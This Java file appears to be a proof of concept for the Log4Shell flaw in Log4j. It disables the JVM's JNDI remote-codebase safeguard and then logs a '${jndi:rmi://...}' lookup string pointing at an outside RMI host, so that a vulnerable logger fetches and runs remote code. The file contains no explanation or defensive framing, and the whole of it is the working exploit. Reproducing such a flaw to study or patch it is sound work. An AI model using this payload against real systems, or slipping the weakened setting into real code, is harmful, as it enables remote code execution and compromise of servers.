package com.jiuzhe.webflux;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Log4jMain {

    private static final Logger LOGGER = LogManager.getLogger();

    static {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
    }

    public static void main(String[] args) {
        String exp = "${jndi:rmi://10.246.21.96:1099/evil}";
        LOGGER.error("hello: {}", exp);
        int i = 0;
    }
}
